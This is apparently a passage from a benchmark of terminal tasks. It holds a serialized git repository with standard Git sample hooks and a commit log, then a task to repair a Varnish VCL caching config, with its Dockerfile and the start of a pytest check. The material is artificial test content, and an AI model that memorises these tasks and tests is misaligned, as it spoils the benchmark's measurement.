3a96bd1b5c1bb8a5292fe3b0bc93308862b9f0bd Developer <dev@example.com> 1753221656 +0100\tcommit: Add API client\n3a96bd1b5c1bb8a5292fe3b0bc93308862b9f0bd 69489b5075b3edba555c54b9a52910c2a5b7d31f Developer <dev@example.com> 1753221656 +0100\tcommit: Add database configuration\n69489b5075b3edba555c54b9a52910c2a5b7d31f 8029d06f03e9014a0331ccd12d2a7314bc7332ea Developer <dev@example.com> 1753221656 +0100\tcommit: Add user management module\n8029d06f03e9014a0331ccd12d2a7314bc7332ea 6a51ae4628ddb53bc7a0562687339acd120681b5 Developer <dev@example.com> 1753221656 +0100\tcommit: Add email configuration\n6a51ae4628ddb53bc7a0562687339acd120681b5 9b931a0475d000f04b1352c664f97415c0886de6 Developer <dev@example.com> 1753221656 +0100\tcommit: Add logging module\n9b931a0475d000f04b1352c664f97415c0886de6 d26ce7cdcf8a387ec20ec9bfc81dd49f997da2ed Developer <dev@example.com> 1753221656 +0100\tcommit: Add deployment script\nd26ce7cdcf8a387ec20ec9bfc81dd49f997da2ed 8b44d34597ab038511522c80bae739c05114c273 Developer <dev@example.com> 1753221656 +0100\tcommit: Add test data\n8b44d34597ab038511522c80bae739c05114c273 f3d4947d80264a2fc0bda16c6728b38b2f8db5ec Developer <dev@example.com> 1753221656 +0100\tcommit: Add AWS configuration\nf3d4947d80264a2fc0bda16c6728b38b2f8db5ec 8ed1c6867f0e07d5a6b8d76f7ff19efa084ec5a6 Developer <dev@example.com> 1753221657 +0100\tcommit: Add OAuth configuration\n8ed1c6867f0e07d5a6b8d76f7ff19efa084ec5a6 cbb146881eb591a902601c8e2e1e024b957daebe Developer <dev@example.com> 1753221657 +0100\tcommit: Add payment processing\ncbb146881eb591a902601c8e2e1e024b957daebe 645abe3108a884ac09d483a50e54773d84cf71ef Developer <dev@example.com> 1753221657 +0100\tcommit: Update README with internal links\n"", ""repo/.git/hooks/commit-msg.sample"": ""#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \""git commit\"" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n# commit.  The hook is allowed to edit the commit message file.\n#\n# To enable this hook, rename this file to \""commit-msg\"".\n\n# Uncomment the below to add a Signed-off-by line to the message.\n# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \""^$SOB\"" \""$1\"" || echo \""$SOB\"" >> \""$1\""\n\n# This example catches duplicate Signed-off-by lines.\n\ntest \""\"" = \""$(grep '^Signed-off-by: ' \""$1\"" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\"" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n"", ""repo/.git/hooks/pre-rebase.sample"": ""#!/bin/sh\n#\n# Copyright (c) 2006, 2008 Junio C Hamano\n#\n# The \""pre-rebase\"" hook is run just before \""git rebase\"" starts doing\n# its job, and can prevent the command from running by exiting with\n# non-zero status.\n#\n# The hook is called with the following parameters:\n#\n# $1 -- the upstream the series was forked from.\n# $2 -- the branch being rebased (or empty when rebasing the current branch).\n#\n# This sample shows how to prevent topic branches that are already\n# merged to 'next' branch from getting rebased, because allowing it\n# would result in rebasing already published history.\n\npublish=next\nbasebranch=\""$1\""\nif test \""$#\"" = 2\nthen\n\ttopic=\""refs/heads/$2\""\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \""$topic\"" in\nrefs/heads/??/*)\n\t;;\n*)\n\texit 0 ;# we do not interrupt others.\n\t;;\nesac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \""$topic\"" || {\n\techo >&2 \""No such branch $topic\""\n\texit 1\n}\n\n# Is topic fully merged to master?\nnot_in_master=`git rev-list --pretty=oneline ^master \""$topic\""`\nif test -z \""$not_in_master\""\nthen\n\techo >&2 \""$topic is fully merged to master; better remove it.\""\n\texit 1 ;# we could allow it, but there is no point.\nfi\n\n# Is topic ever merged to next?  If so you should not be rebasing it.\nonly_next_1=`git rev-list ^master \""^$topic\"" ${publish} | sort`\nonly_next_2=`git rev-list ^master           ${publish} | sort`\nif test \""$only_next_1\"" = \""$only_next_2\""\nthen\n\tnot_in_topic=`git rev-list \""^$topic\"" master`\n\tif test -z \""$not_in_topic\""\n\tthen\n\t\techo >&2 \""$topic is already up to date with master\""\n\t\texit 1 ;# we could allow it, but there is no point.\n\telse\n\t\texit 0\n\tfi\nelse\n\tnot_in_next=`git rev-list --pretty=oneline ^${publish} \""$topic\""`\n\t/usr/bin/perl -e '\n\t\tmy $topic = $ARGV[0];\n\t\tmy $msg = \""* $topic has commits already merged to public branch:\\n\"";\n\t\tmy (%not_in_next) = map {\n\t\t\t/^([0-9a-f]+) /;\n\t\t\t($1 => 1);\n\t\t} split(/\\n/, $ARGV[1]);\n\t\tfor my $elem (map {\n\t\t\t\t/^([0-9a-f]+) (.*)$/;\n\t\t\t\t[$1 => $2];\n\t\t\t} split(/\\n/, $ARGV[2])) {\n\t\t\tif (!exists $not_in_next{$elem->[0]}) {\n\t\t\t\tif ($msg) {\n\t\t\t\t\tprint STDERR $msg;\n\t\t\t\t\tundef $msg;\n\t\t\t\t}\n\t\t\t\tprint STDERR \"" $elem->[1]\\n\"";\n\t\t\t}\n\t\t}\n\t' \""$topic\"" \""$not_in_next\"" \""$not_in_master\""\n\texit 1\nfi\n\n<<\\DOC_END\n\nThis sample hook safeguards topic branches that have been\npublished from being rewound.\n\nThe workflow assumed here is:\n\n * Once a topic branch forks from \""master\"", \""master\"" is never\n   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \""master\"",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \""master\"".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n   branches, merge them into \""next\"" branch.\n\nThe script, being an example, hardcodes the publish branch name\nto be \""next\"", but it is trivial to make it configurable via\n$GIT_DIR/config mechanism.\n\nWith this workflow, you would want to know:\n\n(1) ... if a topic branch has ever been merged to \""next\"".  Young\n    topic branches can have stupid mistakes you would rather\n    clean up before publishing, and things that have not been\n    merged into other branches can be easily rebased without\n    affecting other people.  But once it is published, you would\n    not want to rewind it.\n\n(2) ... if a topic branch has been fully merged to \""master\"".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \""master\"", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n    tip of \""master\"".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \""next\""\n\t\t  /       /           /           /\n\t\t /   a---a---b A     /           /\n\t\t/   /               /           /\n\t       /   /   c---c---c---c B         /\n\t      /   /   /             \\         /\n\t     /   /   /   b---b C     \\       /\n\t    /   /   /   /             \\     /\n    ---o---o---o---o---o---o---o---o---o---o---o \""master\""\n\n\nA, B and C are topic branches.\n\n * A has one fix since it was merged up to \""next\"".\n\n * B has finished.  It has been fully merged up to \""master\"" and \""next\"",\n   and is ready to be deleted.\n\n * C has not merged to \""next\"" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \""master\"".\n\nDOC_END\n"", ""repo/.git/hooks/pre-commit.sample"": ""#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \""git commit\"" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n#\n# To enable this hook, rename this file to \""pre-commit\"".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n# If you want to allow non-ASCII filenames set this variable to true.\nallownonascii=$(git config --type=bool hooks.allownonascii)\n\n# Redirect output to stderr.\nexec 1>&2\n\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \""$allownonascii\"" != \""true\"" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n\nTo be portable it is advisable to rename the file.\n\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n"", ""repo/.git/hooks/applypatch-msg.sample"": ""#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n# appropriate message if it wants to stop the commit.  The hook is\n# allowed to edit the commit message file.\n#\n# To enable this hook, rename this file to \""applypatch-msg\"".\n\n. git-sh-setup\ncommitmsg=\""$(git rev-parse --git-path hooks/commit-msg)\""\ntest -x \""$commitmsg\"" && exec \""$commitmsg\"" ${1+\""$@\""}\n:\n"", ""repo/.git/hooks/fsmonitor-watchman.sample"": ""#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \""query-watchman\"" and set\n# 'git config core.fsmonitor .git/hooks/query-watchman'\n#\nmy ($version, $last_update_token) = @ARGV;\n\n# Uncomment for debugging\n# print STDERR \""$0 $version $last_update_token\\n\"";\n\n# Check the hook interface version\nif ($version ne 2) {\n\tdie \""Unsupported query-fsmonitor hook version '$version'.\\n\"" .\n\t    \""Falling back to scanning...\\n\"";\n}\n\nmy $git_work_tree = get_working_dir();\n\nmy $retry = 1;\n\nmy $json_pkg;\neval {\n\trequire JSON::XS;\n\t$json_pkg = \""JSON::XS\"";\n\t1;\n} or do {\n\trequire JSON::PP;\n\t$json_pkg = \""JSON::PP\"";\n};\n\nlaunch_watchman();\n\nsub launch_watchman {\n\tmy $o = watchman_query();\n\tif (is_work_tree_watched($o)) {\n\t\toutput_result($o->{clock}, @{$o->{files}});\n\t}\n}\n\nsub output_result {\n\tmy ($clockid, @files) = @_;\n\n\t# Uncomment for debugging watchman output\n\t# open (my $fh, \"">\"", \"".git/watchman-output.out\"");\n\t# binmode $fh, \"":utf8\"";\n\t# print $fh \""$clockid\\n@files\\n\"";\n\t# close $fh;\n\n\tbinmode STDOUT, \"":utf8\"";\n\tprint $clockid;\n\tprint \""\\0\"";\n\tlocal $, = \""\\0\"";\n\tprint @files;\n}\n\nsub watchman_clock {\n\tmy $response = qx/watchman clock \""$git_work_tree\""/;\n\tdie \""Failed to get clock id on '$git_work_tree'.\\n\"" .\n\t\t\""Falling back to scanning...\\n\"" if $? != 0;\n\n\treturn $json_pkg->new->utf8->decode($response);\n}\n\nsub watchman_query {\n\tmy $pid = open2(\\*CHLD_OUT, \\*CHLD_IN, 'watchman -j --no-pretty')\n\tor die \""open2() failed: $!\\n\"" .\n\t\""Falling back to scanning...\\n\"";\n\n\t# In the query expression below we're asking for names of files that\n\t# changed since $last_update_token but not from the .git folder.\n\t#\n\t# To accomplish this, we're using the \""since\"" generator to use the\n\t# recency index to select candidate nodes and \""fields\"" to limit the\n\t# output to file names only. Then we're using the \""expression\"" term to\n\t# further constrain the results.\n\tmy $last_update_line = \""\"";\n\tif (substr($last_update_token, 0, 1) eq \""c\"") {\n\t\t$last_update_token = \""\\\""$last_update_token\\\""\"";\n\t\t$last_update_line = qq[\\n\""since\"": $last_update_token,];\n\t}\n\tmy $query = <<\""\tEND\"";\n\t\t[\""query\"", \""$git_work_tree\"", {$last_update_line\n\t\t\t\""fields\"": [\""name\""],\n\t\t\t\""expression\"": [\""not\"", [\""dirname\"", \"".git\""]]\n\t\t}]\n\tEND\n\n\t# Uncomment for debugging the watchman query\n\t# open (my $fh, \"">\"", \"".git/watchman-query.json\"");\n\t# print $fh $query;\n\t# close $fh;\n\n\tprint CHLD_IN $query;\n\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \"">\"", \"".git/watchman-response.json\"");\n\t# print $fh $response;\n\t# close $fh;\n\n\tdie \""Watchman: command returned no output.\\n\"" .\n\t\""Falling back to scanning...\\n\"" if $response eq \""\"";\n\tdie \""Watchman: command returned invalid output: $response\\n\"" .\n\t\""Falling back to scanning...\\n\"" unless $response =~ /^\\{/;\n\n\treturn $json_pkg->new->utf8->decode($response);\n}\n\nsub is_work_tree_watched {\n\tmy ($output) = @_;\n\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \""$git_work_tree\""/;\n\t\tdie \""Failed to make watchman watch '$git_work_tree'.\\n\"" .\n\t\t    \""Falling back to scanning...\\n\"" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n\t\tdie \""Watchman: $error.\\n\"" .\n\t\t\""Falling back to scanning...\\n\"" if $error;\n\n\t\t# Uncomment for debugging watchman output\n\t\t# open (my $fh, \"">\"", \"".git/watchman-output.out\"");\n\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \""everything is dirty\"" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n\t\tdie \""Watchman: $error.\\n\"" .\n\t\t\""Falling back to scanning...\\n\"" if $error;\n\n\t\toutput_result($o->{clock}, (\""/\""));\n\t\t$last_update_token = $o->{clock};\n\n\t\teval { launch_watchman() };\n\t\treturn 0;\n\t}\n\n\tdie \""Watchman: $error.\\n\"" .\n\t\""Falling back to scanning...\\n\"" if $error;\n\n\treturn 1;\n}\n\nsub get_working_dir {\n\tmy $working_dir;\n\tif ($^O =~ 'msys' || $^O =~ 'cygwin') {\n\t\t$working_dir = Win32::GetCwd();\n\t\t$working_dir =~ tr/\\\\/\\//;\n\t} else {\n\t\trequire Cwd;\n\t\t$working_dir = Cwd::cwd();\n\t}\n\n\treturn $working_dir;\n}\n"", ""repo/.git/hooks/pre-receive.sample"": ""#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \""reject\"" push option is used.\n#\n# To enable this hook, rename this file to \""pre-receive\"".\n\nif test -n \""$GIT_PUSH_OPTION_COUNT\""\nthen\n\ti=0\n\twhile test \""$i\"" -lt \""$GIT_PUSH_OPTION_COUNT\""\n\tdo\n\t\teval \""value=\\$GIT_PUSH_OPTION_$i\""\n\t\tcase \""$value\"" in\n\t\techoback=*)\n\t\t\techo \""echo from the pre-receive-hook: ${value#*=}\"" >&2\n\t\t\t;;\n\t\treject)\n\t\t\texit 1\n\t\tesac\n\t\ti=$((i + 1))\n\tdone\nfi\n"", ""repo/.git/hooks/prepare-commit-msg.sample"": ""#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \""git commit\"" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n# message file.  If the hook fails with a non-zero status,\n# the commit is aborted.\n#\n# To enable this hook, rename this file to \""prepare-commit-msg\"".\n\n# This hook includes three examples. The first one removes the\n# \""# Please enter the commit message...\"" help message.\n#\n# The second includes the output of \""git diff --name-status -r\""\n# into the message, just before the \""git status\"" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n#\n# The third example adds a Signed-off-by line to the message, that can\n# still be edited.  This is rarely a good idea.\n\nCOMMIT_MSG_FILE=$1\nCOMMIT_SOURCE=$2\nSHA1=$3\n\n/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' \""$COMMIT_MSG_FILE\""\n\n# case \""$COMMIT_SOURCE,$SHA1\"" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \""\\n\"" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \""$COMMIT_MSG_FILE\"" ;;\n#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \""$SOB\"" \""$COMMIT_MSG_FILE\""\n# if test -z \""$COMMIT_SOURCE\""\n# then\n#   /usr/bin/perl -i.bak -pe 'print \""\\n\"" if !$first_line++' \""$COMMIT_MSG_FILE\""\n# fi\n"", ""repo/.git/hooks/post-update.sample"": ""#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \""post-update\"".\n\nexec git update-server-info\n"", ""repo/.git/hooks/pre-merge-commit.sample"": ""#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \""git merge\"" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n#\n# To enable this hook, rename this file to \""pre-merge-commit\"".\n\n. git-sh-setup\ntest -x \""$GIT_DIR/hooks/pre-commit\"" &&\n        exec \""$GIT_DIR/hooks/pre-commit\""\n:\n"", ""repo/.git/hooks/pre-applypatch.sample"": ""#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n# appropriate message if it wants to stop the commit.\n#\n# To enable this hook, rename this file to \""pre-applypatch\"".\n\n. git-sh-setup\nprecommit=\""$(git rev-parse --git-path hooks/pre-commit)\""\ntest -x \""$precommit\"" && exec \""$precommit\"" ${1+\""$@\""}\n:\n"", ""repo/.git/hooks/pre-push.sample"": ""#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \""git\n# push\"" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n# $1 -- Name of the remote to which the push is being done\n# $2 -- URL to which the push is being done\n#\n# If pushing without using a named remote those arguments will be equal.\n#\n# Information about the commits which are being pushed is supplied as lines to\n# the standard input in the form:\n#\n#   <local ref> <local oid> <remote ref> <remote oid>\n#\n# This sample shows how to prevent push of commits where the log message starts\n# with \""WIP\"" (work in progress).\n\nremote=\""$1\""\nurl=\""$2\""\n\nzero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')\n\nwhile read local_ref local_oid remote_ref remote_oid\ndo\n\tif test \""$local_oid\"" = \""$zero\""\n\tthen\n\t\t# Handle delete\n\t\t:\n\telse\n\t\tif test \""$remote_oid\"" = \""$zero\""\n\t\tthen\n\t\t\t# New branch, examine all commits\n\t\t\trange=\""$local_oid\""\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\""$remote_oid..$local_oid\""\n\t\tfi\n\n\t\t# Check for WIP commit\n\t\tcommit=$(git rev-list -n 1 --grep '^WIP' \""$range\"")\n\t\tif test -n \""$commit\""\n\t\tthen\n\t\t\techo >&2 \""Found WIP commit in $local_ref, not pushing\""\n\t\t\texit 1\n\t\tfi\n\tfi\ndone\n\nexit 0\n"", ""repo/.git/hooks/update.sample"": ""#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \""git receive-pack\"" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \""update\"".\n#\n# Config\n# ------\n# hooks.allowunannotated\n#   This boolean sets whether unannotated tags will be allowed into the\n#   repository.  By default they won't be.\n# hooks.allowdeletetag\n#   This boolean sets whether deleting tags will be allowed in the\n#   repository.  By default they won't be.\n# hooks.allowmodifytag\n#   This boolean sets whether a tag may be modified after creation. By default\n#   it won't be.\n# hooks.allowdeletebranch\n#   This boolean sets whether deleting branches will be allowed in the\n#   repository.  By default they won't be.\n# hooks.denycreatebranch\n#   This boolean sets whether remotely creating branches will be denied\n#   in the repository.  By default this is allowed.\n#\n\n# --- Command line\nrefname=\""$1\""\noldrev=\""$2\""\nnewrev=\""$3\""\n\n# --- Safety check\nif [ -z \""$GIT_DIR\"" ]; then\n\techo \""Don't run this script from the command line.\"" >&2\n\techo \"" (if you want, you could supply GIT_DIR then run\"" >&2\n\techo \""  $0 <ref> <oldrev> <newrev>)\"" >&2\n\texit 1\nfi\n\nif [ -z \""$refname\"" -o -z \""$oldrev\"" -o -z \""$newrev\"" ]; then\n\techo \""usage: $0 <ref> <oldrev> <newrev>\"" >&2\n\texit 1\nfi\n\n# --- Config\nallowunannotated=$(git config --type=bool hooks.allowunannotated)\nallowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)\ndenycreatebranch=$(git config --type=bool hooks.denycreatebranch)\nallowdeletetag=$(git config --type=bool hooks.allowdeletetag)\nallowmodifytag=$(git config --type=bool hooks.allowmodifytag)\n\n# check for no description\nprojectdesc=$(sed -e '1q' \""$GIT_DIR/description\"")\ncase \""$projectdesc\"" in\n\""Unnamed repository\""* | \""\"")\n\techo \""*** Project description file hasn't been set\"" >&2\n\texit 1\n\t;;\nesac\n\n# --- Check types\n# if $newrev is 0000...0000, it's a commit to delete a ref.\nzero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')\nif [ \""$newrev\"" = \""$zero\"" ]; then\n\tnewrev_type=delete\nelse\n\tnewrev_type=$(git cat-file -t $newrev)\nfi\n\ncase \""$refname\"",\""$newrev_type\"" in\n\trefs/tags/*,commit)\n\t\t# un-annotated tag\n\t\tshort_refname=${refname##refs/tags/}\n\t\tif [ \""$allowunannotated\"" != \""true\"" ]; then\n\t\t\techo \""*** The un-annotated tag, $short_refname, is not allowed in this repository\"" >&2\n\t\t\techo \""*** Use 'git tag [ -a | -s ]' for tags you want to propagate.\"" >&2\n\t\t\texit 1\n\t\tfi\n\t\t;;\n\trefs/tags/*,delete)\n\t\t# delete tag\n\t\tif [ \""$allowdeletetag\"" != \""true\"" ]; then\n\t\t\techo \""*** Deleting a tag is not allowed in this repository\"" >&2\n\t\t\texit 1\n\t\tfi\n\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \""$allowmodifytag\"" != \""true\"" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \""*** Tag '$refname' already exists.\"" >&2\n\t\t\techo \""*** Modifying a tag is not allowed in this repository.\"" >&2\n\t\t\texit 1\n\t\tfi\n\t\t;;\n\trefs/heads/*,commit)\n\t\t# branch\n\t\tif [ \""$oldrev\"" = \""$zero\"" -a \""$denycreatebranch\"" = \""true\"" ]; then\n\t\t\techo \""*** Creating a branch is not allowed in this repository\"" >&2\n\t\t\texit 1\n\t\tfi\n\t\t;;\n\trefs/heads/*,delete)\n\t\t# delete branch\n\t\tif [ \""$allowdeletebranch\"" != \""true\"" ]; then\n\t\t\techo \""*** Deleting a branch is not allowed in this repository\"" >&2\n\t\t\texit 1\n\t\tfi\n\t\t;;\n\trefs/remotes/*,commit)\n\t\t# tracking branch\n\t\t;;\n\trefs/remotes/*,delete)\n\t\t# delete tracking branch\n\t\tif [ \""$allowdeletebranch\"" != \""true\"" ]; then\n\t\t\techo \""*** Deleting a tracking branch is not allowed in this repository\"" >&2\n\t\t\texit 1\n\t\tfi\n\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \""*** Update hook: unknown type of update to ref $refname of type $newrev_type\"" >&2\n\t\texit 1\n\t\t;;\nesac\n\n# --- Finished\nexit 0\n"", ""repo/.git/hooks/push-to-checkout.sample"": ""#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n# By default, such a push is refused if the working tree and the index\n# of the remote repository has any difference from the currently\n# checked out commit; when both the working tree and the index match\n# the current commit, they are updated to match the newly pushed tip\n# of the branch. This hook is to be used to override the default\n# behaviour; however the code below reimplements the default behaviour\n# as a starting point for convenient modification.\n#\n# The hook receives the commit with which the tip of the current\n# branch is going to be updated:\ncommit=$1\n\n# It can exit with a non-zero status to refuse the push (when it does\n# so, it must not modify the index or the working tree).\ndie () {\n\techo >&2 \""$*\""\n\texit 1\n}\n\n# Or it can make any necessary changes to the working tree and to the\n# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \""$1\""\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n# The below is a more-or-less exact translation to shell of the C code\n# for the default behaviour for git's push-to-checkout hook defined in\n# the push_to_deploy() function in builtin/receive-pack.c.\n#\n# Note that the hook will be executed from the repository directory,\n# not from the working tree, so if you want to perform operations on\n# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \""cd ..\"" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \""Up-to-date check failed\""\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \""Working directory has unstaged changes\""\nfi\n\n# This is a rough translation of:\n#\n#   head_has_history() ? \""HEAD\"" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \""Working directory has staged changes\""\nfi\n\nif ! git read-tree -u -m \""$commit\""\nthen\n\tdie \""Could not update working tree to new HEAD\""\nfi\n"", ""repo/.git/logs/refs/heads/main"": ""0000000000000000000000000000000000000000 4469f3f694d1420d1ff234ca3528cd210b47de11 Developer <dev@example.com> 1753221656 +0100\tcommit (initial): Initial commit\n4469f3f694d1420d1ff234ca3528cd210b47de11 3a96bd1b5c1bb8a5292fe3b0bc93308862b9f0bd Developer <dev@example.com> 1753221656 +0100\tcommit: Add API client\n3a96bd1b5c1bb8a5292fe3b0bc93308862b9f0bd 69489b5075b3edba555c54b9a52910c2a5b7d31f Developer <dev@example.com> 1753221656 +0100\tcommit: Add database configuration\n69489b5075b3edba555c54b9a52910c2a5b7d31f 8029d06f03e9014a0331ccd12d2a7314bc7332ea Developer <dev@example.com> 1753221656 +0100\tcommit: Add user management module\n8029d06f03e9014a0331ccd12d2a7314bc7332ea 6a51ae4628ddb53bc7a0562687339acd120681b5 Developer <dev@example.com> 1753221656 +0100\tcommit: Add email configuration\n6a51ae4628ddb53bc7a0562687339acd120681b5 9b931a0475d000f04b1352c664f97415c0886de6 Developer <dev@example.com> 1753221656 +0100\tcommit: Add logging module\n9b931a0475d000f04b1352c664f97415c0886de6 d26ce7cdcf8a387ec20ec9bfc81dd49f997da2ed Developer <dev@example.com> 1753221656 +0100\tcommit: Add deployment script\nd26ce7cdcf8a387ec20ec9bfc81dd49f997da2ed 8b44d34597ab038511522c80bae739c05114c273 Developer <dev@example.com> 1753221656 +0100\tcommit: Add test data\n8b44d34597ab038511522c80bae739c05114c273 f3d4947d80264a2fc0bda16c6728b38b2f8db5ec Developer <dev@example.com> 1753221656 +0100\tcommit: Add AWS configuration\nf3d4947d80264a2fc0bda16c6728b38b2f8db5ec 8ed1c6867f0e07d5a6b8d76f7ff19efa084ec5a6 Developer <dev@example.com> 1753221657 +0100\tcommit: Add OAuth configuration\n8ed1c6867f0e07d5a6b8d76f7ff19efa084ec5a6 cbb146881eb591a902601c8e2e1e024b957daebe Developer <dev@example.com> 1753221657 +0100\tcommit: Add payment processing\ncbb146881eb591a902601c8e2e1e024b957daebe 645abe3108a884ac09d483a50e54773d84cf71ef Developer <dev@example.com> 1753221657 +0100\tcommit: Update README with internal links\n"", ""repo/.git/refs/heads/main"": ""645abe3108a884ac09d483a50e54773d84cf71ef\n"", ""repo/.git/refs/tags/v1.0.0"": ""38f4645d77276b4fba4d24ec1ecdcff8cacee61b\n""}",2025-07-22T22:01:20.722869+00:00,2025-07-23T06:43:13.334678+00:00
draft_dp_027642b0,hard,draft_dp_027642b0,system-administration,The Varnish VCL config is broken - fix it to properly cache responses and add X-Cache headers.,system-administration,caching|web-server|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install basic tools
RUN pip install pyyaml

# Set up app directory
WORKDIR /app

# Copy the broken VCL config
COPY default.vcl /app/default.vcl

# Also make a copy in /etc/varnish for tests
RUN mkdir -p /etc/varnish
COPY default.vcl /etc/varnish/default.vcl","import os

def test_vcl_enables_caching():
    """"""Test that VCL config has been fixed to enable caching""""""
    # Check that the VCL file exists
    assert os.path.exists('/app/default.vcl'), ""VCL config not found at /app/default.vcl""
    
    # Read the VCL file
